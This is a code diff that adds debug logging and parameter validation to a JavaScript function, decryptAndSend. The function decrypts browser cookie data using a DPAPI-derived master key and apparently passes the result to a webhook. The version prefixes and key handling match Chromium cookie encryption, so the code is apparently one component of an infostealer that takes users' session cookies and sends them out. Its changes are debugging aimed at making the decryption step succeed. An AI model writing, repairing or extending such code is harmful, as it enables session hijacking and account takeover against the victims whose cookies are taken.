@@ -27,6 +27,12 @@ if (!encryptedCookie || !encryptedKey || !webhookUrl) {
 async function decryptAndSend(encryptedHex, keyB64, webhook) {
     try {
         console.log('[API] Starting decryption...');
+        console.log('[API] Raw inputs:', { 
+            encryptedHexLen: encryptedHex.length, 
+            keyB64Len: keyB64.length,
+            encryptedHexSample: encryptedHex.substring(0, 20) + '...',
+            keyB64Sample: keyB64.substring(0, 20) + '...'
+        });
         
         // Decode the master key from base64 (should be raw 32 bytes after DPAPI decryption in PowerShell)
         const keyData = Uint8Array.from(atob(keyB64), c => c.charCodeAt(0));
@@ -36,6 +42,12 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
         for (let i = 0; i < encryptedHex.length; i += 2) {
             encryptedBytes[i / 2] = parseInt(encryptedHex.substr(i, 2), 16);
         }
+        
+        console.log('[API] Encrypted data info:', { 
+            totalBytes: encryptedBytes.length,
+            firstFewBytes: Array.from(encryptedBytes.slice(0, 10)),
+            prefix: Array.from(encryptedBytes.slice(0, 3))
+        });
         
         // Skip first 3 bytes (v10/v11/v20 prefix)
         const nonce = encryptedBytes.slice(3, 15); // 12 bytes
@@ -47,6 +59,19 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
         
         console.log('[API] Decryption parameters:', { nonceLen: nonce.length, ciphertextLen: ciphertext.length, tagLen: tag.length, keyLen: keyData.length });
         
+        // Validate parameters before attempting decryption
+        if (keyData.length !== 32) {
+            throw new Error(`Invalid key length: ${keyData.length}, expected 32 bytes`);
+        }
+        if (nonce.length !== 12) {
+            throw new Error(`Invalid nonce length: ${nonce.length}, expected 12 bytes`);
+        }
+        if (tag.length !== 16) {
+            throw new Error(`Invalid tag length: ${tag.length}, expected 16 bytes`);
+        }
+        
+        console.log('[API] All parameters validated, importing key...');
+        
         // Import key
         const cryptoKey = await crypto.subtle.importKey(
             'raw',
@@ -56,6 +81,8 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
             ['decrypt']
         );
         
+        console.log('[API] Key imported, starting decryption...');
+        
         // Decrypt
         const plaintext = await crypto.subtle.decrypt(
             { name: 'AES-GCM', iv: nonce, tagLength: 128 },
@@ -63,6 +90,7 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
             new Uint8Array([...ciphertext, ...tag])
         );
         
+        console.log('[API] Decryption completed, decoding text...');
         const cookie = new TextDecoder().decode(plaintext).replace(/\0/g, '').trim();
         console.log('[API] Decryption successful! Cookie length:', cookie.length);
         
